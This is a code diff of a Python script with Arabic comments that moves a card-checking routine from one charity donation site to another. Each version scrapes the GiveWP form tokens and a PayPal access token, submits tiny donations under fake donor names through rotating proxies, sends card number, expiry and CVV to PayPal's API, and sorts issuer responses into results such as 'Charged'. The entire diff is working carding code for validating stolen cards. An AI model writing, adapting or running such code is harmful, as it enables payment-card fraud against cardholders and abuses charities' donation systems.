@@ -281,278 +281,227 @@ def brn6(ccx):
         return 'declined'
 
 
-# ==================== إعدادات الموقع الجديد مع دعم البروكسيات ====================
-SITE_URL = 'https://fightagainstpovertyassociation.com/donations/school-fees/'
-URL_AJAX = 'https://fightagainstpovertyassociation.com/wp-admin/admin-ajax.php'
-
-def extract_data():
-    s, proxy = get_session_with_proxy()
-    s.verify = False
-    ua = get_random_user_agent()
-    headers = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
-    r = s.get(SITE_URL, headers=headers, timeout=30)
-    html = r.text
-    
-    fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
-    fi = re.search(r'name="give-form-id" value="(.*?)"', html)
-    nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
-    
-    if not all([fp, fi, nc]):
-        return None
-        
-    enc = re.search(r'"data-client-token":"(.*?)"', html)
-    if not enc:
-        return None
-        
-    dec = base64.b64decode(enc.group(1)).decode('utf-8')
-    au = re.search(r'"accessToken":"(.*?)"', dec)
-    
-    if not au:
-        return None
-        
-    return {
-        'fp': fp.group(1), 
-        'fi': fi.group(1), 
-        'nc': nc.group(1),
-        'at': au.group(1), 
-        'session': s
-    }
-
+# ==================== إعدادات الموقع الجديد (guinnovation.org) ====================
 def generate_fake_data():
-    first, last = generate_random_name()
-    email = generate_random_email()
-    return {"first_name": first, "last_name": last, "full_name": f"{first} {last}", "email": email, "card_name": f"{first} {last}"}
+    """توليد بيانات وهمية للدفع"""
+    first_names = ['James', 'Emma', 'Michael', 'Sophia', 'William', 'Olivia', 'Noah', 'Ava']
+    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis']
+    first = random.choice(first_names)
+    last = random.choice(last_names)
+    email = f"{first.lower()}{random.randint(100, 9999)}@gmail.com"
+    return {
+        "first_name": first,
+        "last_name": last,
+        "full_name": f"{first} {last}",
+        "email": email,
+        "card_name": f"{first} {last}"
+    }
 
 def pay(ccx):
-    ccx = ccx.strip()
-    parts = ccx.split('|')
-    if len(parts) < 4: 
-        return 'INVALID_FORMAT'
-    
-    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
-    if len(yy) == 2: 
-        yy = '20' + yy
-    
-    fake = generate_fake_data()
-    d = extract_data()
-    
-    if not d: 
-        return 'EXTRACT_FAILED | Could not get form data from site'
-    
-    s = d['session']
-    fp, fi, nc, at = d['fp'], d['fi'], d['nc'], d['at']
-    
-    ua = get_random_user_agent()
-    
-    headers = {
-        'origin': SITE_URL, 
-        'referer': SITE_URL,
-        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-        'sec-ch-ua-mobile': '?1', 
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty', 
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': ua, 
-        'x-requested-with': 'XMLHttpRequest',
-    }
-    
-    data = {
-        'give-honeypot': '', 
-        'give-form-id-prefix': fp, 
-        'give-form-id': fi,
-        'give-form-title': '', 
-        'give-current-url': SITE_URL,
-        'give-form-url': SITE_URL, 
-        'give-form-minimum': '0.50',
-        'give-form-maximum': '999999.99', 
-        'give-form-hash': nc,
-        'give-price-id': '3', 
-        'give-recurring-logged-in-only': '',
-        'give-logged-in-only': '1', 
-        '_give_is_donation_recurring': '0',
-        'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
-        'give-amount': '0.50',
-        'give_stripe_payment_method': '',
-        'payment-mode': 'paypal-commerce', 
-        'give_first': fake['first_name'],
-        'give_last': fake['last_name'], 
-        'give_email': fake['email'],
-        'card_name': fake['card_name'], 
-        'card_exp_month': '', 
-        'card_exp_year': '',
-        'give_action': 'purchase', 
-        'give-gateway': 'paypal-commerce',
-        'action': 'give_process_donation', 
-        'give_ajax': 'true',
-    }
-    
-    s.post(URL_AJAX, headers=headers, data=data, timeout=30)
-    
-    mp = MultipartEncoder(fields={
-        'give-honeypot': (None, ''), 
-        'give-form-id-prefix': (None, fp),
-        'give-form-id': (None, fi), 
-        'give-form-title': (None, ''),
-        'give-current-url': (None, SITE_URL), 
-        'give-form-url': (None, SITE_URL),
-        'give-form-minimum': (None, '0.50'), 
-        'give-form-maximum': (None, '999999.99'),
-        'give-form-hash': (None, nc), 
-        'give-price-id': (None, '3'),
-        'give-recurring-logged-in-only': (None, ''), 
-        'give-logged-in-only': (None, '1'),
-        '_give_is_donation_recurring': (None, '0'),
-        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
-        'give-amount': (None, '0.50'),
-        'give_stripe_payment_method': (None, ''),
-        'payment-mode': (None, 'paypal-commerce'), 
-        'give_first': (None, fake['first_name']),
-        'give_last': (None, fake['last_name']), 
-        'give_email': (None, fake['email']),
-        'card_name': (None, fake['card_name']), 
-        'card_exp_month': (None, ''),
-        'card_exp_year': (None, ''), 
-        'give-gateway': (None, 'paypal-commerce'),
-    })
-    headers['content-type'] = mp.content_type
-    
-    r1 = s.post(f'{URL_AJAX}?action=give_paypal_commerce_create_order', headers=headers, data=mp, timeout=30)
+    """
+    دالة الفحص الرئيسية - مستوحاة من jo2.py
+    تستخدم موقع guinnovation.org
+    """
     try:
-        tok = r1.json()['data']['id']
-    except:
-        return f'ORDER_ERROR: {r1.text[:150]}'
-    
-    pp_headers = {
-        'authority': 'cors.api.paypal.com', 
-        'accept': '*/*',
-        'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
-        'authorization': f'Bearer {at}',
-        'braintree-sdk-version': '3.32.0-payments-sdk-dev',
-        'content-type': 'application/json',
-        'origin': 'https://assets.braintreegateway.com',
-        'referer': 'https://assets.braintreegateway.com/',
-        'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?1', 
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty', 
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site', 
-        'user-agent': ua,
-    }
-    
-    json_data = {
-        'payment_source': {
-            'card': {
-                'number': cc, 
-                'expiry': f'{yy}-{mm}', 
-                'security_code': cvv,
-                'attributes': {
-                    'verification': {
-                        'method': 'SCA_WHEN_REQUIRED'
-                    }
-                }
-            }
-        },
-        'application_context': {
-            'vault': False
-        },
-    }
-    
-    s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', 
-           headers=pp_headers, json=json_data, timeout=30)
-    
-    mp2 = MultipartEncoder(fields={
-        'give-honeypot': (None, ''), 
-        'give-form-id-prefix': (None, fp),
-        'give-form-id': (None, fi), 
-        'give-form-title': (None, ''),
-        'give-current-url': (None, SITE_URL), 
-        'give-form-url': (None, SITE_URL),
-        'give-form-minimum': (None, '0.50'), 
-        'give-form-maximum': (None, '999999.99'),
-        'give-form-hash': (None, nc), 
-        'give-price-id': (None, '3'),
-        'give-recurring-logged-in-only': (None, ''), 
-        'give-logged-in-only': (None, '1'),
-        '_give_is_donation_recurring': (None, '0'),
-        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
-        'give-amount': (None, '0.50'),
-        'give_stripe_payment_method': (None, ''),
-        'payment-mode': (None, 'paypal-commerce'), 
-        'give_first': (None, fake['first_name']),
-        'give_last': (None, fake['last_name']), 
-        'give_email': (None, fake['email']),
-        'card_name': (None, fake['card_name']), 
-        'card_exp_month': (None, ''),
-        'card_exp_year': (None, ''), 
-        'give-gateway': (None, 'paypal-commerce'),
-    })
-    headers['content-type'] = mp2.content_type
-    
-    r2 = s.post(f'{URL_AJAX}?action=give_paypal_commerce_approve_order&order=' + tok, headers=headers, data=mp2, timeout=30)
-    txt = r2.text
-    
-    # الردود
-    if 'DO_NOT_HONOR' in txt: 
-        return 'Declined | Do not honor'
-    elif 'ACCOUNT_CLOSED' in txt: 
-        return 'Declined | Account closed'
-    elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in txt: 
-        return 'Declined | Account closed'
-    elif 'LOST_OR_STOLEN' in txt: 
-        return 'Declined | LOST OR STOLEN'
-    elif 'CVV2_FAILURE' in txt: 
-        return 'Declined | Card Issuer Declined CVV'
-    elif 'SUSPECTED_FRAUD' in txt: 
-        return 'Declined | SUSPECTED FRAUD'
-    elif 'INVALID_ACCOUNT' in txt: 
-        return 'Declined | INVALID_ACCOUNT'
-    elif 'REATTEMPT_NOT_PERMITTED' in txt: 
-        return 'Declined | REATTEMPT NOT PERMITTED'
-    elif 'ACCOUNT BLOCKED BY ISSUER' in txt: 
-        return 'Declined | ACCOUNT_BLOCKED_BY_ISSUER'
-    elif 'ORDER_NOT_APPROVED' in txt: 
-        return 'Declined | ORDER_NOT_APPROVED'
-    elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in txt: 
-        return 'Declined | PICKUP_CARD_SPECIAL_CONDITIONS'
-    elif 'PAYER_CANNOT_PAY' in txt: 
-        return 'Declined | PAYER CANNOT PAY'
-    elif 'INSUFFICIENT_FUNDS' in txt: 
-        return 'Declined | Insufficient Funds'
-    elif 'GENERIC_DECLINE' in txt: 
-        return 'Declined | GENERIC_DECLINE'
-    elif 'COMPLIANCE_VIOLATION' in txt: 
-        return 'Declined | COMPLIANCE VIOLATION'
-    elif 'TRANSACTION_NOT PERMITTED' in txt: 
-        return 'Declined | TRANSACTION NOT PERMITTED'
-    elif 'PAYMENT_DENIED' in txt: 
-        return 'Declined | PAYMENT_DENIED'
-    elif 'INVALID_TRANSACTION' in txt: 
-        return 'Declined | INVALID TRANSACTION'
-    elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in txt: 
-        return 'Declined | RESTRICTED OR INACTIVE ACCOUNT'
-    elif 'SECURITY_VIOLATION' in txt: 
-        return 'Declined | SECURITY_VIOLATION'
-    elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in txt: 
-        return 'Declined | DECLINED DUE TO UPDATED ACCOUNT'
-    elif 'INVALID_OR_RESTRICTED_CARD' in txt: 
-        return 'Declined | INVALID CARD'
-    elif 'EXPIRED_CARD' in txt: 
-        return 'Declined | EXPIRED CARD'
-    elif 'CRYPTOGRAPHIC_FAILURE' in txt: 
-        return 'Declined | CRYPTOGRAPHIC FAILURE'
-    elif 'TRANSACTION_CANNOT_BE_COMPLETED' in txt: 
-        return 'Declined | TRANSACTION CANNOT BE COMPLETED'
-    elif 'DECLINED_PLEASE_RETRY' in txt: 
-        return 'Declined | DECLINED PLEASE RETRY LATER'
-    elif 'TX_ATTEMPTS_EXCEED_LIMIT' in txt: 
-        return 'Declined | EXCEED LIMIT'
-    elif 'true' in txt or 'sucsess' in txt or 'COMPLETED' in txt:
-        return 'Charged !'
-    else:
-        try:
-            return f"Response | {json.loads(txt)['data']['error']}"
-        except:
-            return f'Response | {txt[:300]}'
+        ccx = ccx.strip()
+        parts = ccx.split('|')
+        if len(parts) < 4:
+            return 'INVALID_FORMAT'
+        
+        number = parts[0]
+        month = parts[1].zfill(2)
+        year = parts[2]
+        cvc = parts[3]
+        
+        if "20" in year:
+            year = year.split("20")[1]
+        else:
+            year = year[-2:] if len(year) > 2 else year
+        
+        fake = generate_fake_data()
+        s, proxy = get_session_with_proxy()
+        user = get_random_user_agent()
+        
+        if proxy:
+            proxy_ip = proxy['http'].split('@')[-1].split(':')[0] if '@' in proxy['http'] else 'unknown'
+            print(f"[*] Using proxy for payment: {proxy_ip}")
+        else:
+            print(f"[*] No proxy, running directly")
+        
+        # الموقع الجديد من jo2.py
+        url = 'https://guinnovation.org/donate/'
+        url_iframe = 'https://guinnovation.org/give/donate/'
+        url_ajax = 'https://guinnovation.org/wp-admin/admin-ajax.php'
+        
+        headers = {'user-agent': user}
+        
+        # 1. جلب الصفحة الرئيسية
+        s.get(url, headers=headers, timeout=30)
+        
+        # 2. جلب صفحة iframe
+        params = {'giveDonationFormInIframe': '1'}
+        r = s.get(url_iframe, params=params, headers=headers, timeout=30)
+        html = r.text
+        
+        # 3. استخراج البيانات
+        form_hash = re.search(r'name="give-form-hash"\s+value="(.*?)"', html).group(1)
+        register_hash = re.search(r'name="give-form-user-register-hash"\s+value="(.*?)"', html).group(1)
+        form_id = re.search(r'name="give-form-id"\s+value="(.*?)"', html).group(1)
+        form_prefix = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', html).group(1)
+        enc_token = re.search(r'"data-client-token":"(.*?)"', html).group(1)
+        kol = base64.b64decode(enc_token).decode('utf-8')
+        access_token = re.findall(r'"accessToken":"(.*?)"', kol)[0]
+        
+        print(f"[*] Got access token: {access_token[:50]}...")
+        
+        # 4. Create Order
+        params_create = {'action': 'give_paypal_commerce_create_order'}
+        data = {
+            'give-honeypot': '',
+            'give-form-id-prefix': form_prefix,
+            'give-form-id': form_id,
+            'give-form-title': 'Donate',
+            'give-current-url': url,
+            'give-form-url': url_iframe,
+            'give-form-minimum': '0.60',
+            'give-form-maximum': '999999.99',
+            'give-form-hash': form_hash,
+            'give-price-id': '0',
+            'give-recurring-logged-in-only': '',
+            'give-logged-in-only': '1',
+            '_give_is_donation_recurring': '0',
+            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
+            'give-amount': '0.60',
+            'give-recurring-period-donors-choice': 'month',
+            'give_stripe_payment_method': '',
+            'give_first': fake['first_name'],
+            'give_last': fake['last_name'],
+            'give_email': fake['email'],
+            'give-form-user-register-hash': register_hash,
+            'give-purchase-var': 'needs-to-register',
+            'give_tributes_type': 'In honor of',
+            'give_tributes_show_dedication': 'no',
+            'give_tributes_radio_type': 'In honor of',
+            'give_tributes_first_name': '',
+            'give_tributes_last_name': '',
+            'give_tributes_would_to': 'send_eCard',
+            'give_tributes_ecard_notify[recipient][personalized][]': '',
+            'give_tributes_ecard_notify[recipient][first_name][]': '',
+            'give_tributes_ecard_notify[recipient][last_name][]': '',
+            'give_tributes_ecard_notify[recipient][email][]': '',
+            'payment-mode': 'paypal-commerce',
+            'card_name': fake['card_name'],
+            'card_exp_month': '',
+            'card_exp_year': '',
+            'give-gateway': 'paypal-commerce',
+            'give_embed_form': '1',
+        }
+        
+        r = s.post(url_ajax, params=params_create, headers=headers, data=data, timeout=30)
+        order_id = r.json()['data']['id']
+        print(f"[*] Order created: {order_id}")
+        
+        # 5. Confirm with PayPal API
+        headers_paypal = {
+            'authority': 'cors.api.paypal.com',
+            'accept': '*/*',
+            'authorization': f'Bearer {access_token}',
+            'content-type': 'application/json',
+            'user-agent': user,
+        }
+        
+        json_data = {
+            'payment_source': {
+                'card': {
+                    'number': number,
+                    'expiry': f'20{year}-{month}',
+                    'security_code': cvc,
+                    'attributes': {
+                        'verification': {
+                            'method': 'SCA_WHEN_REQUIRED',
+                        },
+                    },
+                },
+            },
+            'application_context': {
+                'vault': False,
+            },
+        }
+        
+        s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
+               headers=headers_paypal, json=json_data, timeout=30)
+        
+        # 6. Approve Order
+        params_approve = {'action': 'give_paypal_commerce_approve_order', 'order': order_id}
+        r = s.post(url_ajax, params=params_approve, headers=headers, data=data, timeout=30)
+        text = r.text.upper()
+        
+        # 7. تحليل الردود (مطابق لـ jo2.py)
+        if '"STATUS":"COMPLETED"' in text and '"RESPONSE_CODE":"0000"' in text:
+            return "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
+        elif 'DO_NOT_HONOR' in text:
+            return "DO_NOT_HONOR"
+        elif 'COMPLETED' in text:
+            return "Approved No Charge"
+        elif 'ACCOUNT_CLOSED' in text:
+            return "ACCOUNT_CLOSED"
+        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
+            return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
+        elif 'LOST_OR_STOLEN' in text:
+            return "LOST_OR_STOLEN"
+        elif 'CVV2_FAILURE' in text:
+            return "CVV2_FAILURE"
+        elif 'SUSPECTED_FRAUD' in text:
+            return "SUSPECTED_FRAUD"
+        elif 'INVALID_ACCOUNT' in text:
+            return "INVALID_ACCOUNT"
+        elif 'REATTEMPT_NOT_PERMITTED' in text:
+            return "REATTEMPT_NOT_PERMITTED"
+        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
+            return "ACCOUNT_BLOCKED_BY_ISSUER"
+        elif 'ORDER_NOT_APPROVED' in text:
+            return "ORDER_NOT_APPROVED"
+        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
+            return "PICKUP_CARD_SPECIAL_CONDITIONS"
+        elif 'PAYER_CANNOT_PAY' in text:
+            return "PAYER_CANNOT_PAY"
+        elif 'INSUFFICIENT_FUNDS' in text:
+            return "INSUFFICIENT_FUNDS ✅"
+        elif 'GENERIC_DECLINE' in text:
+            return "GENERIC_DECLINE"
+        elif 'COMPLIANCE_VIOLATION' in text:
+            return "COMPLIANCE_VIOLATION"
+        elif 'TRANSACTION_NOT_PERMITTED' in text:
+            return "TRANSACTION_NOT_PERMITTED"
+        elif 'PAYMENT_DENIED' in text:
+            return "PAYMENT_DENIED"
+        elif 'INVALID_MERCHANT' in text:
+            return "INVALID_MERCHANT"
+        elif 'AMOUNT_EXCEEDED' in text:
+            return "AMOUNT_EXCEEDED"
+        elif 'INVALID_TRANSACTION' in text:
+            return "INVALID_TRANSACTION"
+        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
+            return "RESTRICTED_OR_INACTIVE_ACCOUNT"
+        elif 'SECURITY_VIOLATION' in text:
+            return "SECURITY_VIOLATION"
+        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
+            return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
+        elif 'INVALID_OR_RESTRICTED_CARD' in text:
+            return "INVALID_OR_RESTRICTED_CARD"
+        elif 'EXPIRED_CARD' in text:
+            return "EXPIRED_CARD"
+        elif 'CRYPTOGRAPHIC_FAILURE' in text:
+            return "CRYPTOGRAPHIC_FAILURE"
+        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
+            return "TRANSACTION_CANNOT_BE_COMPLETED"
+        elif 'DECLINED_PLEASE_RETRY' in text:
+            return "DECLINED_PLEASE_RETRY"
+        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
+            return "TX_ATTEMPTS_EXCEED_LIMIT"
+        else:
+            return "DECLINED"
+            
+    except Exception as e:
+        print(f"Payment error: {e}")
+        return "ERROR"
